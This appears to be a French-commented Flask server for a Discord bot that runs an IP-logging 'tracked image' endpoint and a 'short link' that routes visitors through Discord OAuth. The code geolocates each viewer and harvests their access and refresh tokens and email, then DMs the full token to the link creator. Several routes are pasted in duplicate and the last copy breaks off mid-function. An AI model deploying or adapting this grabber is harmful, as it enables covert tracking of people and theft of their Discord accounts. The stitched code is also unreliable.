import io
import sqlite3
from flask import Flask, request, redirect, send_file
from datetime import datetime
from user_agents import parse
import asyncio
from threading import Lock
import discord
import requests
import os
from urllib.parse import urlencode

app = Flask(__name__)
bot_instance = None
notify_lock = Lock()
click_codes = {}

def init_shortlink_db():
    """Initialise la base de données pour les liens courts et les images trackées"""
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    
    # Table des liens courts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            user_id INTEGER NOT NULL,
            guild_id INTEGER NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0
        )
    ''')
    
    # Table des images trackées
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS image_trackers (
            id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            guild_id INTEGER NOT NULL,
            title TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0,
            image_data BLOB
        )
    ''')
    
    # Table des clics sur les images
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS image_clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tracker_id TEXT NOT NULL,
            ip_address TEXT,
            browser TEXT,
            device_type TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            user_agent TEXT,
            clicked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(tracker_id) REFERENCES image_trackers(id)
        )
    ''')
    
    # Vérifier si la colonne image_data existe
    columns = {row[1] for row in cursor.execute("PRAGMA table_info(image_trackers)")}
    if "image_data" not in columns:
        cursor.execute("ALTER TABLE image_trackers ADD COLUMN image_data BLOB")
    
    conn.commit()
    conn.close()

def get_os_info(user_agent_str):
    """Extrait les informations du système d'exploitation depuis le User-Agent"""
    os_info = "Inconnu"
    if 'Windows' in user_agent_str:
        if 'Windows NT 10.0' in user_agent_str:
            os_info = "🪟 Windows 10/11"
        elif 'Windows NT 6.3' in user_agent_str:
            os_info = "🪟 Windows 8.1"
        elif 'Windows NT 6.2' in user_agent_str:
            os_info = "🪟 Windows 8"
        elif 'Windows NT 6.1' in user_agent_str:
            os_info = "🪟 Windows 7"
        else:
            os_info = "🪟 Windows"
    elif 'Mac' in user_agent_str:
        os_info = "🍎 macOS"
    elif 'Linux' in user_agent_str:
        os_info = "🐧 Linux"
    elif 'Android' in user_agent_str:
        os_info = "🤖 Android"
    elif 'iPhone' in user_agent_str or 'iPad' in user_agent_str:
        os_info = "🍎 iOS"
    
    return os_info

def get_ip_info(ip_address):
    """Récupère les informations géographiques d'une IP via ip-api.com"""
    try:
        response = requests.get(f'https://ip-api.com/json/{ip_address}?lang=fr', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Inconnu'),
                    'country_code': data.get('countryCode', 'XX'),
                    'region': data.get('regionName', 'Inconnu'),
                    'city': data.get('city', 'Inconnu'),
                    'isp': data.get('isp', 'Inconnu'),
                    'org': data.get('org', 'Inconnu'),
                    'lat': data.get('lat', 'N/A'),
                    'lon': data.get('lon', 'N/A'),
                    'timezone': data.get('timezone', 'Inconnu')
                }
    except Exception as e:
        print(f"Erreur lors de la récupération des infos IP: {e}")
    
    return None

async def notify_discord_image_click(owner_id, tracker_id, title, ip_address, browser, device_type, user_agent_str, ip_info):
    """Envoie une notification Discord en DM quand une image trackée est chargée"""
    if not bot_instance:
        return
    
    try:
        owner = await bot_instance.fetch_user(owner_id)
        os_info = get_os_info(user_agent_str)
        
        embed = discord.Embed(
            title="🖼️ Quelqu'un a chargé ton image trackée !",
            description=f"L'image **{title}** a été ouverte 👀",
            color=discord.Color.blurple(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔗 ID du tracker", value=f"`{tracker_id}`", inline=False)
        
        # Informations système
        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        embed.add_field(name="Système", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        
        # Informations réseau
        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        
        # Géolocalisation
        if ip_info:
            embed.add_field(name="🗺️ GÉOLOCALISATION", value="‎", inline=False)
            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
            embed.add_field(name="Code Pays", value=f"💾 {ip_info['country_code']}", inline=True)
            embed.add_field(name="Organisation", value=f"🏢 {ip_info['org']}", inline=True)
        
        # Détails techniques
        embed.add_field(name="📋 DÉTAILS TECHNIQUES", value="‎", inline=False)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        
        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        
        embed.set_footer(text="Image Tracker | Détection de chargement")
        
        await owner.send(embed=embed)
        print(f"✅ Notification envoyée à l'utilisateur {owner_id} pour l'image {tracker_id}")
    except discord.Forbidden:
        print(f"❌ Impossible d'envoyer un DM à l'utilisateur {owner_id} (DMs fermés)")
    except Exception as e:
        print(f"❌ Erreur lors de l'envoi de la notification: {e}")

@app.route('/image/<tracker_id>')
def serve_tracked_image(tracker_id):
    """
    Sert une image trackée et enregistre les informations du visiteur
    Route: /image/<tracker_id>
    """
    # Récupérer l'image depuis la base de données
    conn = sqlite3.connect("links.db")
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, title, image_data
        FROM image_trackers
        WHERE id = ?
    ''', (tracker_id,))
    
    tracker = cursor.fetchone()
    
    if not tracker or not tracker["image_data"]:
        conn.close()
        return "Image non trouvée", 404
    
    # Récupérer les données de l'image
    image_bytes = tracker["image_data"]
    owner_id = tracker["user_id"]
    title = tracker["title"]
    
    # Extraire les informations du visiteur
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent_obj = parse(user_agent_str)
    
    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
    browser_family = user_agent_obj.browser.family or 'Inconnu'
    browser = str(browser_family)
    
    # Récupérer l'adresse IP réelle (Railway utilise X-Forwarded-For)
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address:
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
    else:
        ip_address = 'Inconnu'
    
    # Récupérer les infos de géolocalisation
    ip_info = None
    if ip_address not in ('', 'Inconnu', None):
        ip_info = get_ip_info(ip_address)
    
    country = ip_info.get('country') if ip_info else 'Inconnu'
    region = ip_info.get('region') if ip_info else 'Inconnu'
    city = ip_info.get('city') if ip_info else 'Inconnu'
    
    # Enregistrer le clic dans la base de données
    cursor.execute('''
        INSERT INTO image_clicks (tracker_id, ip_address, browser, device_type, country, region, city, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (tracker_id, ip_address, browser, device_type, country, region, city, user_agent_str))
    
    cursor.execute('''
        UPDATE image_trackers
        SET clicks = clicks + 1
        WHERE id = ?
    ''', (tracker_id,))
    
    conn.commit()
    conn.close()
    
    # Envoyer la notification Discord de manière asynchrone
    if bot_instance:
        try:
            asyncio.run_coroutine_threadsafe(
                notify_discord_image_click(owner_id, tracker_id, title, ip_address, browser, device_type, user_agent_str, ip_info),
                bot_instance.loop
            )
            print(f"🔔 Notification planifiée pour le tracker {tracker_id}")
        except Exception as e:
            print(f"❌ Erreur lors de la planification de la notification: {e}")
    
    # Retourner l'image
    buffer = io.BytesIO(image_bytes)
    buffer.seek(0)
    response = send_file(buffer, mimetype='image/png')
    response.headers['Cache-Control'] = 'no-store, max-age=0'
    return response

async def notify_discord_shortlink(creator_id, short_id, ip_address, browser, device_type, user_agent_str):
    """Envoie une notification Discord quand un lien court est cliqué"""
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        user_agent_obj = parse(user_agent_str)
        os_info = get_os_info(user_agent_str)
        ip_info = get_ip_info(ip_address)
        
        embed = discord.Embed(
            title="✨ Quelqu'un a cliqué sur ton lien!",
            description=f"Le lien **{short_id}** a reçu une visite 👀",
            color=discord.Color.brand_green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔗 ID du lien", value=f"`{short_id}`", inline=False)
        
        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        embed.add_field(name="Système", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        
        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        
        if ip_info:
            embed.add_field(name="🗺️ Géolocalisation", value="‎", inline=False)
            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
            embed.add_field(name="Code Pays", value=f"💾 {ip_info['country_code']}", inline=True)
            embed.add_field(name="Organisation", value=f"🏢 {ip_info['org']}", inline=True)
        
        embed.add_field(name="📋 DÉTAILS TECHNIQUES", value="‎", inline=False)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        
        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        
        embed.set_footer(text="Lien court | Détection de visite")
        
        await creator.send(embed=embed)
    except Exception as e:
        pass

@app.route('/health')
def health_check():
    """Route de santé pour Railway"""
    return {'status': 'healthy', 'service': 'image-tracker'}, 200

def run_server(bot=None):
    """Démarre le serveur Flask"""
    global bot_instance
    bot_instance = bot
    init_shortlink_db()
    print("🚀 Serveur Flask démarré sur le port 5001")
    print(f"📡 Endpoint images: /image/<tracker_id>")
    print(f"🔗 Endpoint liens: /link/<short_id>")
    app.run(host='0.0.0.0', port=5001, debug=False)

DISCORD_CLIENT_ID = os.getenv('DISCORD_CLIENT_ID')
DISCORD_CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET')
DISCORD_REDIRECT_URI = os.getenv('DISCORD_REDIRECT_URI', 'https://votre-app.railway.app/oauth/callback')

@app.route('/link/<short_id>')
def shortlink_redirect(short_id):
    """Redirige vers OAuth Discord avant d'accéder au lien"""
    # Vérifier que le lien existe
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute('SELECT original_url FROM custom_links WHERE id = ?', (short_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return "Lien non trouvé", 404
    
    # Rediriger vers Discord OAuth
    params = {
        'client_id': DISCORD_CLIENT_ID,
        'redirect_uri': DISCORD_REDIRECT_URI,
        'response_type': 'code',
        'scope': 'identify email guilds',
        'state': short_id  # Passer l'ID du lien comme state
    }
    
    oauth_url = f"https://discord.com/api/oauth2/authorize?{urlencode(params)}"
    return redirect(oauth_url)

@app.route('/oauth/callback')
def oauth_callback():
    """Callback OAuth2 - Échange le code contre un token"""
    code = request.args.get('code')
    state = request.args.get('state')  # C'est notre short_id
    
    if not code or not state:
        return "Erreur OAuth", 400
    
    # Échanger le code contre un access token
    data = {
        'client_id': DISCORD_CLIENT_ID,
        'client_secret': DISCORD_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': DISCORD_REDIRECT_URI
    }
    
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    response = requests.post(
        'https://discord.com/api/oauth2/token',
        data=data,
        headers=headers
    )
    
    if response.status_code != 200:
        return "Erreur lors de l'authentification", 400
    
    token_data = response.json()
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')
    
    # Récupérer les infos de l'utilisateur
    user_response = requests.get(
        'https://discord.com/api/users/@me',
        headers={'Authorization': f'Bearer {access_token}'}
    )
    
    user_data = user_response.json()
    user_id = user_data.get('id')
    username = user_data.get('username')
    email = user_data.get('email')
    
    # Enregistrer le token dans la base de données
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    
    # Créer la table si elle n'existe pas
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS oauth_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_id TEXT NOT NULL,
            user_id TEXT NOT NULL,
            username TEXT,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(short_id) REFERENCES custom_links(id)
        )
    ''')
    
    # Extraire les infos du visiteur
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    # Enregistrer le token
    cursor.execute('''
        INSERT INTO oauth_tokens (short_id, user_id, username, email, access_token, refresh_token, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (state, user_id, username, email, access_token, refresh_token, ip_address, user_agent_str))
    
    # Récupérer le lien original
    cursor.execute('SELECT original_url, user_id FROM custom_links WHERE id = ?', (state,))
    result = cursor.fetchone()
    
    if not result:
        conn.close()
        return "Lien non trouvé", 404
    
    original_url, creator_id = result
    
    # Incrémenter le compteur de clics
    cursor.execute('UPDATE custom_links SET clicks = clicks + 1 WHERE id = ?', (state,))
    
    conn.commit()
    conn.close()
    
    # Notifier le créateur du lien en DM
    if bot_instance:
        try:
            asyncio.run_coroutine_threadsafe(
                notify_oauth_success(creator_id, state, user_id, username, email, access_token, ip_address),
                bot_instance.loop
            )
        except Exception as e:
            print(f"Erreur notification: {e}")
    
    # Rediriger vers l'URL originale
    return redirect(original_url)

async def notify_oauth_success(creator_id, short_id, user_id, username, email, access_token, ip_address):
    """Envoie une notification avec le token récupéré"""
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        
        embed = discord.Embed(
            title="🎯 TOKEN DISCORD RÉCUPÉRÉ !",
            description=f"Quelqu'un a autorisé l'accès via ton lien `{short_id}`",
            color=discord.Color.gold(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 ID Discord", value=f"`{user_id}`", inline=False)
        embed.add_field(name="👥 Username", value=username, inline=True)
        embed.add_field(name="📧 Email", value=email or "Non partagé", inline=True)
        
        embed.add_field(name="🔑 ACCESS TOKEN (COMPLET)", value=f"```{access_token}```", inline=False)
        embed.add_field(name="🌐 Adresse IP", value=f"`{ip_address}`", inline=False)
        
        embed.add_field(
            name="💾 Consulter avec",
            value="Utilise: `+linktokens <short_id>` pour voir toutes les infos capturées",
            inline=False
        )
        
        embed.set_footer(text="OAuth2 Token Capture | Utilisation éthique obligatoire")
        
        await creator.send(embed=embed)
        
    except Exception as e:
        print(f"Erreur notification OAuth: {e}")

@app.route('/link/<short_id>')
def shortlink_redirect(short_id):
    """Redirige vers OAuth Discord avant d'accéder au lien"""
    # Vérifier que le lien existe
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute('SELECT original_url FROM custom_links WHERE id = ?', (short_id,))
    result = cursor.fetchone()
    conn.close()

    if not result:
        return "Lien non trouvé", 404

    # Récupérer les informations du visiteur
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address:
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
    else:
        ip_address = 'Inconnu'

    # Rediriger vers Discord OAuth
    params = {
        'client_id': DISCORD_CLIENT_ID,
        'redirect_uri': DISCORD_REDIRECT_URI,
        'response_type': 'code',
        'scope': 'identify email guilds',
        'state': short_id  # Passer l'ID du lien comme state
    }

    oauth_url = f"https://discord.com/api/oauth2/authorize?{urlencode(params)}"
    return redirect(oauth_url)

@app.route('/oauth/callback')
def oauth_callback():
    """Callback OAuth2 - Échange le code contre un token"""
    code = request.args.get('code')
    state = request.args.get('state')  # C'est notre short_id

    if not code or not state:
        return "Erreur OAuth", 400

    # Échanger le code contre un access token
    data = {
        'client_id': DISCORD_CLIENT_ID,
        'client_secret': DISCORD_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': DISCORD_REDIRECT_URI
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.post(
        'https://discord.com/api/oauth2/token',
        data=data,
        headers=headers
    )

    if response.status_code != 200:
        return "Erreur lors de l'authentification", 400

    token_data = response.json()
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')

    # Récupérer les infos de l'utilisateur
    user_response = requests.get(
        'https://discord.com/api/users/@me',
        headers={'Authorization': f'Bearer {access_token}'}
    )

    user_data = user_response.json()
    user_id = user_data.get('id')
    username = user_data.get('username')
    email = user_data.get('email')

    # Enregistrer le token dans la base de données
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()

    # Créer la table si elle n'existe pas
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS oauth_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_id TEXT NOT NULL,
            user_id TEXT NOT NULL,
            username TEXT,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(short_id) REFERENCES custom_links(id)
        )
    ''')

    # Extraire les infos du visiteur
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()

    # Enregistrer le token
    cursor.execute('''
        INSERT INTO oauth_tokens (short_id, user_id, username, email, access_token, refresh_token, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (state, user_id, username, email, access_token, refresh_token, ip_address, user_agent_str))

    # Récupérer le lien original
    cursor.execute('SELECT original_url, user_id FROM custom_links WHERE id = ?', (state,))
    result = cursor.fetchone()

    if not result:
        conn.close()
        return "Lien non trouvé", 404

    original_url, creator_id = result

    # Incrémenter le compteur de clics
    cursor.execute('UPDATE custom_links SET clicks = clicks + 1 WHERE id = ?', (state,))

    conn.commit()
    conn.close()

    # Notifier le créateur du lien en DM
    if bot_instance:
        try:
            asyncio.run_coroutine_threadsafe(
                notify_oauth_success(creator_id, state, user_id, username, email, access_token, ip_address),
                bot_instance.loop
            )
        except Exception as e:
            print(f"Erreur notification: {e}")

    # Rediriger vers l'URL originale
    return redirect(original_url)

import logging

logging.basicConfig(level=logging.DEBUG)

@app.route('/oauth/callback')
def oauth_callback():
    """Callback OAuth2 - Échange le code contre un token"""
    code = request.args.get('code')
    state = request.args.get('state')  # C'est notre short_id

    if not code or not state:
        logging.error("Erreur OAuth: code ou state manquant")
        return "Erreur OAuth", 400

    # Échanger le code contre un access token
    data = {
        'client_id': DISCORD_CLIENT_ID,
        'client_secret': DISCORD_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': DISCORD_REDIRECT_URI
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.post(
        'https://discord.com/api/oauth2/token',
        data=data,
        headers=headers
    )

    if response.status_code != 200:
        logging.error("Erreur lors de l'authentification: %s", response.text)
        return "Erreur lors de l'authentification", 400

    token_data = response.json()
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')

    # Récupérer les infos de l'utilisateur
    user_response = requests.get(
        'https://discord.com/api/users/@me',
        headers={'Authorization': f'Bearer {access_token}'}
    )

    user_data = user_response.json()
    user_id = user_data.get('id')
    username = user_data.get('username')
    email = user_data.get('email')

    # Enregistrer le token dans la base de données
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()

    # Créer la table si elle n'existe pas
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS oauth_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_id TEXT NOT NULL,
            user_id TEXT NOT NULL,
            username TEXT,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            ip_address TEXT,
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(short_id) REFERENCES custom_links(id)
        )
    ''')

    # Extraire les infos du visiteur
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()

    # Enregistrer le token